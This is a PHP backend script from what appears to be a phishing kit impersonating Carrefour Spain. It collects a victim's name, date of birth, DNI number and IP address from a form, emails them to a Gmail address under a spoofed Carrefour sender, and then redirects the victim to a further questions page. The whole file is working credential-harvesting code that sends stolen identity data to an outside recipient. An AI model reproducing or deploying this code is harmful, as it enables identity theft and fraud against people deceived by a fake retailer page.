<?php
$ip = getenv("REMOTE_ADDR");

$swn6 = $_POST['lastName'];
$swn7 = $_POST['firstName'];
$swn8 = $_POST['day'];
$swn9 = $_POST['month'];
$swn5 = $_POST['year'];
$swn4 = $_POST['phoneNumber'];





$subj = "[ $ip $CC ]";
$msg = " --------------------INFO CARREFOUR SPAIN ----------------------\n
 last Name: $swn6 \n
 First Name: $swn7 \n
 Day : $swn8 \n
 Month: $swn9 \n
 year: $swn5 \n
 DNI: $swn4 \n

 
 IP: $ip \n --------------------BY THE_WOOLF----------------------";
 $from = "From: CARREFOUR <ss@p3plcpnl0992.prod.phx3.secureserver.net>"; 
 mail("louannedu490@gmail.com", "$subj", "$msg" , "$from");


?>
<html>
<head></head>
<body>
<Script Language='Javascript'>
document.location = "questions.htm";
</Script>
</body>
</html>